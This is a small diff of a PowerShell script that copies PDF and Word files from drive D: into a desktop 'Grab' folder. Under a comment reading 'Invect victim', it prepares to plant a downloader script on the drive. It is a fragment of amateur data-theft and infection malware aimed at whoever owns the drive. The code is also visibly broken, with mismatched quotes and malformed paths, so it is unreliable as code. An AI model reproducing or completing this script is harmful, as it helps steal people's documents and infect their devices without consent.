@@ -1,7 +1,7 @@
-$output = "%User%\Desktop\Grap"
+$output = "%User%\Desktop\Grab"
 $input = "D:\*.pdf,*.docx"
 $inputv = "%User%\Desktop\V\Downloader.bat"
-$outputv = "D:\Schüler.ps1"
+$outputv = "D:\test.ps1"
 Copy-Item -path $input -destination $output
 #Invect victim
 $sise = "(gci -path "D:\" -r | sort Length -desc | select fullname -f 1)"
